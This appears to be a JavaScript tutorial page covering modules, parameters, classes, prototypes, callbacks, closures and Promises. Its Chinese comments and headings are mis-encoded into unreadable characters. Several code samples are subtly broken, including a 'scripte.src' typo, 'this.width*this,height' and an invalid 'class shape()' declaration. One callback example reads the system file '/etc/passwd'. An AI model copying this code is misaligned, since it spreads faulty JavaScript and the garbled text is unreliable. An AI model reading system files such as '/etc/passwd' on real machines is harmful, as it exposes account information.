      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//profile.js</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;aa&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">&quot;bb&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> &#123;a,b&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;a,b&#125; <span class="keyword">from</span> <span class="string">&#x27;./profile.js&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">  element.textContent = a + <span class="string">&#x27; &#x27;</span> + b;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>




        <h3 id="2-Default-para"   >
          <a href="#2-Default-para" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Default-para" class="headerlink" title="(2)Default para"></a>(2)Default para</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params">a=<span class="number">1</span>,b=<span class="string">&quot;Hello&quot;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>digtal + undefined = NaN</p>

        <h3 id="3-Rest-para"   >
          <a href="#3-Rest-para" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Rest-para" class="headerlink" title="(3)Rest para"></a>(3)Rest para</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//the ArgsArrayæ”¾ç½®çš„æ˜¯å¤šä½™çš„å‚æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params">a,b,... the_ArgsArray</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> c=the_ArgsArray[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">...values</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;values.length;i++) &#123;</span><br><span class="line">        sum += values[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2,5,3è¢«æ”¾ç½®åœ¨valuesæ•°ç»„ä¸­</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>) <span class="comment">//è¿”å›10</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="4-spread-operator"   >
          <a href="#4-spread-operator" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-spread-operator" class="headerlink" title="(4)spread operator"></a>(4)spread operator</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> anArray=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">myFunc(...anArray);<span class="comment">//å°†æ•°ç»„anArrayçš„æ¯ä¸ªå…ƒç´ ä½œä¸ºå‡½æ•°å‚æ•°ä¼ ç»™myFuncå‡½æ•°</span></span><br><span class="line"><span class="keyword">var</span> o=[<span class="number">5</span>,...anArray,<span class="number">6</span>];</span><br></pre></td></tr></table></div></figure>


        <h3 id="5-æ¨¡æ¿ç±»å­—ç¬¦ä¸²string"   >
          <a href="#5-æ¨¡æ¿ç±»å­—ç¬¦ä¸²string" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-æ¨¡æ¿ç±»å­—ç¬¦ä¸²string" class="headerlink" title="(5)æ¨¡æ¿ç±»å­—ç¬¦ä¸²string"></a>(5)æ¨¡æ¿ç±»å­—ç¬¦ä¸²string</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatGreetings</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str=</span><br><span class="line">        <span class="string">`Hi <span class="subst">$&#123;name&#125;</span>  your age is  <span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">&#125;<span class="comment">//æ–°ç‰¹æ€§å­—ç¬¦ä¸²çš„æ‹¼æ¥</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="6-éå†"   >
          <a href="#6-éå†" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-éå†" class="headerlink" title="(6)éå†"></a>(6)éå†</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(ent <span class="keyword">of</span> a)&#123;</span><br><span class="line">    sum+=ent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="11-ç±»å’Œå¯¹è±¡"   >
          <a href="#11-ç±»å’Œå¯¹è±¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#11-ç±»å’Œå¯¹è±¡" class="headerlink" title="11.ç±»å’Œå¯¹è±¡"></a>11.ç±»å’Œå¯¹è±¡</h2>
      
        <h3 id="1-å£°æ˜å’Œæ·»åŠ "   >
          <a href="#1-å£°æ˜å’Œæ·»åŠ " class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å£°æ˜å’Œæ·»åŠ " class="headerlink" title="(1)å£°æ˜å’Œæ·»åŠ "></a>(1)å£°æ˜å’Œæ·»åŠ </h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;<span class="attr">oldProp</span>:<span class="string">&#x27;old&#x27;</span>&#125;;</span><br><span class="line">o.aMethod = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">this</span>.newProp = <span class="string">&#x27;new&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">Object</span>.keys(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">o.aMethod();</span><br><span class="line"><span class="comment">//oçš„æˆå‘˜å³ä¸º[oldProp,newProp,aMethod]</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å‡½æ•°å³ä¸ºå¯¹è±¡"   >
          <a href="#2-å‡½æ•°å³ä¸ºå¯¹è±¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‡½æ•°å³ä¸ºå¯¹è±¡" class="headerlink" title="(2)å‡½æ•°å³ä¸ºå¯¹è±¡"></a>(2)å‡½æ•°å³ä¸ºå¯¹è±¡</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="built_in">this</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line">func.toString();</span><br><span class="line">func.call(&#123;<span class="attr">t</span>:<span class="number">1</span>&#125;,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//callä½¿å¾—funcè¿™ä¸ªå¯¹è±¡å°±ä¼šå˜æˆ&#123;t:1&#125;</span></span><br><span class="line"><span class="keyword">let</span> newFunc = func.bind(&#123;<span class="attr">z</span>:<span class="number">2</span>&#125;,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//bindä¼šè¿”å›ä¸€ä¸ªæ–°çš„å¯¹è±¡ä¸º&#123;z:2&#125;</span></span><br><span class="line"><span class="comment">//æ‰€æœ‰å¯¹è±¡éƒ½æœ‰toString,call,bindç­‰æ–¹æ³•</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="3-å®šä¹‰ç±»å’Œå®ä¾‹åŒ–"   >
          <a href="#3-å®šä¹‰ç±»å’Œå®ä¾‹åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å®šä¹‰ç±»å’Œå®ä¾‹åŒ–" class="headerlink" title="(3)å®šä¹‰ç±»å’Œå®ä¾‹åŒ–"></a>(3)å®šä¹‰ç±»å’Œå®ä¾‹åŒ–</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Rectangle</span>(<span class="params">width,height</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">this</span>.width = width;</span><br><span class="line">	<span class="built_in">this</span>.height = height;</span><br><span class="line">	<span class="built_in">this</span>.area = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.width*<span class="built_in">this</span>.height;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> Rectangle(<span class="number">26</span>,<span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŸ¥çœ‹objdçš„æ„é€ æ–¹æ³•æ˜¯ä¸æ˜¯&#x27;Rectangle&#x27;</span></span><br><span class="line">obj.constructor.name == <span class="string">&#x27;Rectangle&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç»™Objå¢åŠ å±æ€§description</span></span><br><span class="line">obj.description = <span class="string">&#x27;big Rectangle&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="keyword">new</span> Rectangle(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">obj2.tell = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(width+<span class="string">&quot;;&quot;</span>+height);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä»¥ä¸Šæ–¹æ³•å¢åŠ çš„å±æ€§åœ¨å¯¹è±¡é‡Œï¼Œä¸åœ¨ç±»é‡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj);</span><br><span class="line"><span class="built_in">console</span>.log(obj2);</span><br></pre></td></tr></table></div></figure>


        <h3 id="4-ä¸ºç±»å¢åŠ å±æ€§æ–¹æ³•"   >
          <a href="#4-ä¸ºç±»å¢åŠ å±æ€§æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ä¸ºç±»å¢åŠ å±æ€§æ–¹æ³•" class="headerlink" title="(4)ä¸ºç±»å¢åŠ å±æ€§æ–¹æ³•"></a>(4)ä¸ºç±»å¢åŠ å±æ€§æ–¹æ³•</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Rectangle</span>(<span class="params">width,height</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">this</span>.width = width;</span><br><span class="line">	<span class="built_in">this</span>.height = height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨prototypeç»™Rectangleè¿™ä¸ªç±»å¢åŠ æˆå‘˜</span></span><br><span class="line">Rectangle.prototype.area = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">this</span>.width*<span class="built_in">this</span>,height;</span><br><span class="line">&#125;;</span><br><span class="line">Rectangle.prototype.description = <span class="string">&#x27;Hello!&#x27;</span>;</span><br><span class="line"><span class="comment">//è¿™ç§æ–¹æ³•ç›¸å½“äºä¿®æ”¹ç±»çš„å®šä¹‰ï¼Œæ‰€æœ‰çš„å®ä¾‹åŒ–å¯¹è±¡éƒ½ä¼šè¢«ä¿®æ”¹æ‰</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="5-æ–°ç‰ˆçš„ç±»"   >
          <a href="#5-æ–°ç‰ˆçš„ç±»" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-æ–°ç‰ˆçš„ç±»" class="headerlink" title="(5)æ–°ç‰ˆçš„ç±»"></a>(5)æ–°ç‰ˆçš„ç±»</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shape</span>()</span>&#123;</span><br><span class="line">	<span class="function"><span class="title">constructor</span>(<span class="params">str</span>)</span>&#123;<span class="built_in">this</span>.str = str&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> <span class="keyword">extends</span> <span class="title">shape</span> </span>= ...</span><br></pre></td></tr></table></div></figure>


        <h2 id="12-å‡½æ•°å¼ç¼–ç¨‹"   >
          <a href="#12-å‡½æ•°å¼ç¼–ç¨‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#12-å‡½æ•°å¼ç¼–ç¨‹" class="headerlink" title="12.å‡½æ•°å¼ç¼–ç¨‹"></a>12.å‡½æ•°å¼ç¼–ç¨‹</h2>
      
        <h3 id="1-å¤„ç†å­—ç¬¦ä¸²"   >
          <a href="#1-å¤„ç†å­—ç¬¦ä¸²" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¤„ç†å­—ç¬¦ä¸²" class="headerlink" title="(1)å¤„ç†å­—ç¬¦ä¸²"></a>(1)å¤„ç†å­—ç¬¦ä¸²</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> anArr = [<span class="number">45</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">25</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterFunc</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> value&lt;<span class="number">45</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapFunc</span>(<span class="params">value,idx</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> value*idx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduceFunc</span>(<span class="params">total,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> total+value</span><br><span class="line">&#125;</span><br><span class="line">anArr.filter(filterFunc).map(mapFunc).reduce(reduceFunc)</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-å›è°ƒå‡½æ•°"   >
          <a href="#2-å›è°ƒå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å›è°ƒå‡½æ•°" class="headerlink" title="(2)å›è°ƒå‡½æ•°"></a>(2)å›è°ƒå‡½æ•°</h3>
      <p>ä¸»è¦ç”¨æ¥è·Ÿè¸ªå¼‚æ­¥çš„å‡½æ•°è°ƒç”¨è¡Œä¸ºï¼Œç¡®ä¿æ­£å¸¸å¼‚æ­¥åŠ è½½ç»“æŸ</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//å¯ä»¥å¼‚æ­¥è°ƒç”¨è¯¥å‡½æ•°,ä½¿å¾—è¯¥å‡½æ•°åé¢çš„å…¶ä»–è„šæœ¬ä¹ŸåŒæ—¶è¿è¡Œ</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">src</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        scripte.src = src;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.head.append(script);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    loadScript(<span class="string">&#x27;./myScript.js&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    newFunction();</span></span><br><span class="line"><span class="javascript">    <span class="comment">//å½“newFunction()åœ¨myScript.jsä¸­æ—¶ï¼Œå¦‚æœmyScript.jsæ²¡æœ‰åŠ è½½å®Œï¼Œåˆ™ç›´æ¥è°ƒç”¨</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//newFunctionä¼šå‡ºé”™ï¼Œå› ä¸ºæ²¡æœ‰åŠ è½½ä¸Š</span></span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript">    <span class="comment">//ä½¿ç”¨å›è°ƒå‡½æ•°ç¡®ä¿è„šæœ¬åŠ è½½å®Œæˆå†è°ƒç”¨å…¶ä¸­çš„å‡½æ•° </span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">callbackFunc</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        newFunction();</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">src,callback</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        scripte.src = src;</span></span><br><span class="line"><span class="javascript">        script.onload = <span class="function">() =&gt;</span> callback(script);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.head.append(script);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    loadScript(<span class="string">&#x27;./myScript.js&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">//è¿™æ ·åœ¨loadScriptå‡½æ•°æ‰§è¡Œå®Œæˆä¹‹åæ‰ä¼šæ‰§è¡ŒcallbackFuncä»è€Œè°ƒç”¨newFunction</span></span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript">	<span class="comment">//3*1000æ¯«ç§’åæ‰§è¡ŒcallbackFunc</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">setTimeout</span>(callbackFunc,<span class="number">3</span>*<span class="number">1000</span>)</span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript">    <span class="comment">//è¯»å®Œæ–‡ä»¶ä¹‹åå†è°ƒç”¨callbackFunc</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">callbackFunc</span>(<span class="params">err,data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">String</span>(data));</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    fs.readFile(<span class="string">&#x27;/etc/passwd&#x27;</span>,callbackFunc);</span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="â–²æ³¨"   >
          <a href="#â–²æ³¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²æ³¨" class="headerlink" title="â–²æ³¨"></a>â–²æ³¨</h4>
      <p>æ–¹æ³•ï¼šä»£è¡¨å¯¹è±¡é‡Œé¢çš„å‡½æ•°</p>
<p>å‡½æ•°ï¼šå¯¹è±¡å¤–éƒ¨çš„å‡½æ•°</p>

        <h3 id="3-é—­åŒ…"   >
          <a href="#3-é—­åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-é—­åŒ…" class="headerlink" title="(3)é—­åŒ…"></a>(3)é—­åŒ…</h3>
      <p>å³åœ¨è°ƒç”¨å‡½æ•°å¯¹è±¡å†…éƒ¨çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¿®æ”¹å‡½æ•°å¯¹è±¡å†…çš„æˆå‘˜ï¼Œè¯¥æˆå‘˜å¯ä»¥å¾—åˆ°ä¿®æ”¹ä½¿ç”¨ï¼Œå°±ç±»ä¼¼äºjavaä¸­çš„æ¥å£è®¾ç½®ã€‚</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myObj = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> privateProp1 = <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">var</span> privateProp2 = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> setPrivate1 = <span class="function"><span class="keyword">function</span>(<span class="params">val1</span>) </span>&#123; privateProp1 = val1; &#125;</span><br><span class="line">    <span class="keyword">var</span> compute = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="keyword">return</span> privateProp1 + privateProp2;&#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">compute</span>: compute, <span class="attr">setPrivate1</span>: setPrivate1&#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">//å³å¯ä»¥é€šè¿‡æ¥å£å‡½æ•°setPrivate1å’Œcomputeæ¥è®¿é—®å…¶privateProp1å’ŒprivateProp2</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="13-ç±»å‹åˆ¤æ–­"   >
          <a href="#13-ç±»å‹åˆ¤æ–­" class="heading-link"><i class="fas fa-link"></i></a><a href="#13-ç±»å‹åˆ¤æ–­" class="headerlink" title="13.ç±»å‹åˆ¤æ–­"></a>13.ç±»å‹åˆ¤æ–­</h2>
      <p><code>==</code>ï¼šåªåˆ¤æ–­å€¼ï¼Œfalseå’Œfalseæ¯”è¾ƒéƒ½ä¸ºtrueâ€¦</p>
<p><code>===</code>ï¼šåˆ¤æ–­ç±»å‹å’Œå€¼</p>

        <h2 id="14-Promiseæ›¿ä»£å›è°ƒå‡½æ•°"   >
          <a href="#14-Promiseæ›¿ä»£å›è°ƒå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#14-Promiseæ›¿ä»£å›è°ƒå‡½æ•°" class="headerlink" title="14.Promiseæ›¿ä»£å›è°ƒå‡½æ•°"></a>14.Promiseæ›¿ä»£å›è°ƒå‡½æ•°</h2>
      <p>å°†æ‰§è¡Œç»“æœä¿å­˜ï¼Œç„¶ååˆ©ç”¨å‡½æ•°å¤„ç†</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç­‰å¾…1ç§’åæ‰§è¡Œresolveï¼Œå°†ç»“æœç»™åˆ°promise.resultä¸­</span></span><br><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> resolve(<span class="string">&quot;done!&quot;</span>), <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸€èˆ¬ç”¨æ¥å¤„ç†promiseçš„æ‰§è¡Œç»“æœ</span></span><br><span class="line">promise.then(</span><br><span class="line">    <span class="function"><span class="params">result</span> =&gt;</span> alert(result), <span class="comment">// shows &quot;done!&quot; after 1 second</span></span><br><span class="line">    <span class="function"><span class="params">error</span> =&gt;</span> alert(error) <span class="comment">// doesn&#x27;t run</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//catchåªå¤„ç†é”™è¯¯ç»“æœ</span></span><br><span class="line">promise.catch(error);</span><br></pre></td></tr></table></div></figure>

<p>åŠ è½½è„šæœ¬çš„å¤„ç†</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">        script.src = src;</span><br><span class="line">        script.onload = <span class="function">() =&gt;</span> resolve(script);</span><br><span class="line">        script.onerror = <span class="function">() =&gt;</span> reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`Script load error for <span class="subst">$&#123;src&#125;</span>`</span>));</span><br><span class="line">        <span class="built_in">document</span>.head.append(script);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">loadScript(src).then(func...);</span><br></pre></td></tr></table></div></figure>


        <h2 id="15-async-awaitè¯­æ³•"   >
          <a href="#15-async-awaitè¯­æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#15-async-awaitè¯­æ³•" class="headerlink" title="15.async/awaitè¯­æ³•"></a>15.async/awaitè¯­æ³•</h2>
      <p>asyncå¼‚æ­¥æ‰§è¡Œ</p>
<p>deferæ ‡å¿—åæµè§ˆå™¨å®Œå…¨è§£æå®Œæ‰ä¼šæ‰§è¡Œscriptä»£ç </p>
<p>ç»å¸¸åŠ å…¥ asyncå’Œdeferæ¥ä½¿å¾—å¼‚æ­¥åŠ è½½domæ ‘ï¼Œä»å¤–éƒ¨å¼•å…¥javascriptä»£ç </p>

